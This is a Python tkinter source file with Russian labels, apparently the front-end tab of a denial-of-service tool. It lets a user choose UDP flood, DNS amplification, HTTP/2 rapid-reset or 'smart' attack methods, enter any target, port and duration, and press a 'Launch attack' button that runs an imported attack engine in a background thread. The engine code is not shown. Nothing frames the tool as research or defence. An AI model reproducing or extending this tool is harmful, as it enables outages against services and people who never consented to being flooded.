import tkinter as tk
from tkinter import ttk, messagebox
import threading
import json
from engine.attack import AsyncAttackEngine
from utils.logger import log

class AttackTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.engine = AsyncAttackEngine()
        self.build_ui()

    def build_ui(self):
        # Метод атаки
        tk.Label(self, text="Метод:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.method_var = tk.StringVar(value="udp")
        methods = ["udp", "dns_amp", "http2_reset", "smart"]
        ttk.Combobox(self, textvariable=self.method_var, values=methods).grid(row=0, column=1, padx=5)
        # Цель
        tk.Label(self, text="Цель:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.target_entry = tk.Entry(self, width=30)
        self.target_entry.grid(row=1, column=1, padx=5)
        # Порт
        tk.Label(self, text="Порт:").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.port_entry = tk.Entry(self, width=10)
        self.port_entry.insert(0, "80")
        self.port_entry.grid(row=2, column=1, padx=5, sticky=tk.W)
        # Длительность
        tk.Label(self, text="Длительность (с):").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.duration_entry = tk.Entry(self, width=10)
        self.duration_entry.insert(0, "60")
        self.duration_entry.grid(row=3, column=1, padx=5, sticky=tk.W)
        # Кнопка
        self.start_btn = tk.Button(self, text="Запустить атаку", command=self.start_attack)
        self.start_btn.grid(row=4, column=0, columnspan=2, pady=10)
        # Статус
        self.status_label = tk.Label(self, text="")
        self.status_label.grid(row=5, column=0, columnspan=2)

    def start_attack(self):
        method = self.method_var.get()
        target = self.target_entry.get()
        port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        self.status_label.config(text="Атака запущена...")
        threading.Thread(target=self._run_attack, args=(method, target, port, duration)).start()

    def _run_attack(self, method, target, port, duration):
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.engine.run_attack(method, target, port, duration))
        self.status_label.config(text="Атака завершена.")
